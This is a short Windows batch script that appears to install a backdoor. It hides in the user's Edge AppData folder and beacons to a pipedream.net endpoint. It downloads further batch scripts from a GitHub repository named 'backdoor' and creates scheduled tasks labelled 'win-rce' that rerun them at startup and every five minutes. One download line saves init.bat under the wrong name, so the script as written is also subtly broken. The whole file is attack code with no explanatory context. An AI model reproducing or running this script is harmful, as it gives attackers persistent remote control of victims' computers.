cd C:\Users\%username%\Appdata\Local\Microsoft\Edge
curl -d "{'event':'initalization'}" https://eojlk5hggkgar9y.m.pipedream.net
curl -o recur.bat "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/recur.bat"
curl -o recur.bat "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/init.bat"
schtasks /CREATE /TN "win-rce-startup" /TR "C:\Users\%username%\Appdata\Local\Microsoft\Edge\recur.bat" /SC ONSTART
schtasks /CREATE /TN "win-rce-interval" /TR "C:\Users\%username%\Appdata\Local\Microsoft\Edge\recur.bat" /SC MINUTE /MO 5
schtasks /CREATE /TN "win-rce-installer-startup" /TR "C:\Users\%username%\Appdata\Local\Microsoft\Edge\init.bat" /SC ONSTART
schtasks /CREATE /TN "win-rce-installer-interval" /TR "C:\Users\%username%\Appdata\Local\Microsoft\Edge\init.bat" /SC MINUTE /MO 5
